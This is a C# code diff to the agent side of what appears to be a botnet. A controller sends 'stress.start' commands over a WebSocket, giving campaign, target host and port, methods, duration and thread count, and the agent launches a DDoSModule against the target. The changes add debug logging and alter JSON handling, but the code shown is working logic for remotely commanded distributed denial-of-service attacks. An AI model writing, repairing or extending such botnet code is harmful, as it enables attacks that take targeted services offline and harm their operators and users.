@@ -347,10 +347,12 @@ public class AgentEngine
                 break;
 
             case "stress.start":
+                Console.WriteLine($"[Agent] Received stress.start command");
                 await HandleStressStart(msg, ct);
                 break;
 
             case "stress.stop":
+                Console.WriteLine($"[Agent] Received stress.stop command");
                 await HandleStressStop(msg, ct);
                 break;
         }
@@ -906,28 +908,33 @@ public class AgentEngine
 
     private async Task HandleStressStart(WebSocketMessage msg, CancellationToken ct)
     {
-        if (_ws == null) return;
+        if (_ws == null) { Console.WriteLine("[Agent] stress.start: _ws is null"); return; }
 
         try
         {
             var data = msg.Data?.GetRawText();
-            if (data == null) return;
+            if (data == null) { Console.WriteLine("[Agent] stress.start: msg.Data is null"); return; }
+            Console.WriteLine($"[Agent] stress.start config JSON: {data}");
 
-            var config = System.Text.Json.JsonSerializer.Deserialize<StressConfig>(data);
-            if (config == null) return;
+            var config = System.Text.Json.JsonSerializer.Deserialize(data, WsJsonContext.Default.StressConfig);
+            if (config == null) { Console.WriteLine("[Agent] stress.start: deserialized to null"); return; }
+            Console.WriteLine($"[Agent] stress.start deserialized: campaign={config.CampaignId}, target={config.TargetHost}:{config.TargetPort}, methods=[{string.Join(",", config.Methods)}], duration={config.DurationSeconds}s, threads={config.ThreadsPerAgent}");
 
             // Stop any existing attack
             _ddos?.Dispose();
 
             _ddos = new DDoSModule(_ws, _agentId, _hostname);
             await _ddos.StartAsync(config, ct);
+            Console.WriteLine($"[Agent] stress.start: DDoSModule.StartAsync completed");
 
             await _ws.SendResultRawAsync("stress.started", _agentId, "{\"ok\":true}");
+            Console.WriteLine($"[Agent] stress.start: sent ok response");
         }
         catch (Exception ex)
         {
+            Console.WriteLine($"[Agent] stress.start ERROR: {ex}");
             try { await _ws.SendResultRawAsync("stress.started", _agentId,
-                System.Text.Json.JsonSerializer.Serialize(new { ok = false, error = ex.Message })); } catch { }
+                $"{{\"ok\":false,\"error\":\"{JsonEscape(ex.Message)}\"}}"); } catch { }
         }
     }
 
@@ -950,7 +957,7 @@ public class AgentEngine
             {
                 if (_ws != null)
                     await _ws.SendResultRawAsync("stress.stopped", _agentId,
-                        System.Text.Json.JsonSerializer.Serialize(new { ok = false, error = ex.Message }));
+                        $"{{\"ok\":false,\"error\":\"{JsonEscape(ex.Message)}\"}}");
             }
             catch { }
         }
